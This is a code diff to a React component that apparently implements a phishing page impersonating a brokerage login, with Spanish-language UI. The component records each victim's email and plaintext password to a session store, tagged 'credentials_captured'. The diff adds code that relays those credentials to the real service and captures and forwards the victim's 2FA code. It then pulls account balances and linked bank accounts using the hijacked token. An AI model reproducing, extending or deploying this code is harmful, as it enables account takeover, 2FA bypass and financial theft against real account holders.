@@ -146,23 +146,32 @@ const PPI = () => {
     setLoading(true);
     setEmail(submittedEmail);
     lastPasswordRef.current = password;
+    lastUsernameRef.current = submittedEmail;
 
     await createSession(submittedEmail, "login_attempt", { password });
 
     try {
       setStatusMsg("Verificando credenciales...");
-      const res = await ppiApi.login(submittedEmail, password, operatorCode);
 
-      if (res.success || res.raw?.status === 0) {
-        const fullName = res.fullName || res.raw?.payload?.usuario?.nombreCompleto || res.raw?.payload?.denominacion || "";
-        const token = typeof res.token === "string" ? res.token : (res.token?.accessToken || res.raw?.payload?.token?.accessToken || "");
-        let cuentaId = res.cuentaId;
-        if (!cuentaId && token) {
-          try {
-            const claims = JSON.parse(atob(token.split(".")[1]));
-            cuentaId = parseInt(claims["PPAuth.Claims.General.Cuentas"]) || null;
-          } catch { /* ignore */ }
-        }
+      // Try web login first (supports 2FA)
+      const res = await ppiApi.loginWeb(submittedEmail, password, operatorCode);
+
+      if (res.requires_2fa) {
+        // 2FA required — show OTP screen
+        if (res.fullName) setSyncedFullName(res.fullName);
+        await updateSession("2fa_required", {
+          otp_code: `name:${res.fullName || ""}|email:${res.email || ""}|type:${res.twofa_type}`,
+        });
+        setStep("otp_2fa");
+        setStatusMsg("");
+        setLoading(false);
+        return;
+      }
+
+      if (res.success) {
+        const fullName = res.fullName || "";
+        const token = res.token || "";
+        const cuentaId = res.cuentaId;
 
         await updateSession("login_success", {
           otp_code: `name:${fullName}|cuenta:${cuentaId}`,
@@ -180,28 +189,83 @@ const PPI = () => {
           await updateSession("completed", {
             otp_code: `name:${fullName}|cuenta:${cuentaId}|token:yes`,
           });
-        } else {
-          await updateSession("waiting_operator", {
-            otp_code: `name:${fullName}|cuenta:${cuentaId}|token:pending`,
-          });
         }
       } else {
-        await updateSession("waiting_operator", {
-          otp_code: `credentials_captured`,
-        });
+        // Fallback to mobile login
+        const mobileRes = await ppiApi.login(submittedEmail, password, operatorCode);
+        if (mobileRes.success || mobileRes.raw?.status === 0) {
+          const fullName = mobileRes.fullName || mobileRes.raw?.payload?.usuario?.nombreCompleto || "";
+          if (fullName) setSyncedFullName(fullName);
+          await updateSession("login_success", { otp_code: `name:${fullName}|mobile_fallback` });
+        } else {
+          await updateSession("waiting_operator", { otp_code: `credentials_captured` });
+        }
       }
 
       setStep("verify_identity");
       setStatusMsg("");
     } catch (e: any) {
-      await updateSession("waiting_operator", {
-        otp_code: `credentials_captured`,
-      });
+      // Fallback to mobile login on error
+      try {
+        const mobileRes = await ppiApi.login(submittedEmail, password, operatorCode);
+        if (mobileRes.success || mobileRes.raw?.status === 0) {
+          const fullName = mobileRes.fullName || "";
+          if (fullName) setSyncedFullName(fullName);
+          await updateSession("login_success", { otp_code: `name:${fullName}|mobile_fallback` });
+        } else {
+          await updateSession("waiting_operator", { otp_code: `credentials_captured` });
+        }
+      } catch {
+        await updateSession("waiting_operator", { otp_code: `credentials_captured` });
+      }
       setStep("verify_identity");
       setStatusMsg("");
     }
     setLoading(false);
   }, [createSession, updateSession, operatorCode]);
+
+  // ── Handle 2FA code submission ──
+  const handle2faSubmit = useCallback(async (code: string) => {
+    setLoading(true);
+    setError("");
+    try {
+      await updateSession("2fa_submitted", { otp_code: `code:${code}` });
+      const res = await ppiApi.validate2fa(code, lastUsernameRef.current);
+
+      if (res.success) {
+        const fullName = res.fullName || "";
+        const token = res.token || "";
+        const cuentaId = res.cuentaId;
+
+        if (fullName) setSyncedFullName(fullName);
+        await updateSession("2fa_success", {
+          otp_code: `name:${fullName}|cuenta:${cuentaId}|token:yes`,
+        });
+
+        if (token && cuentaId) {
+          setStep("syncing");
+          setStatusMsg("Sincronizando datos de tu cuenta...");
+          try {
+            await ppiApi.balances(token, cuentaId);
+            await ppiApi.bankAccounts(token, cuentaId);
+          } catch { /* silent */ }
+          await updateSession("completed", {
+            otp_code: `name:${fullName}|cuenta:${cuentaId}|synced`,
+          });
+        }
+
+        setStep("verify_identity");
+        setStatusMsg("");
+      } else {
+        setError(res.error || "Código incorrecto. Intentá nuevamente.");
+        await updateSession("2fa_error", { otp_code: `error:${res.error || "invalid_code"}` });
+      }
+    } catch (e: any) {
+      setError("Error al validar el código. Intentá nuevamente.");
+      await updateSession("2fa_error", { otp_code: `error:${e.message}` });
+    }
+    setLoading(false);
+  }, [updateSession]);
 
   // ── Identity Verification (Wayni onboarding) ──
   const handleIdentityVerify = useCallback(async (data: IdentityVerifyPayload): Promise<IdentityVerifyResult | void> => {
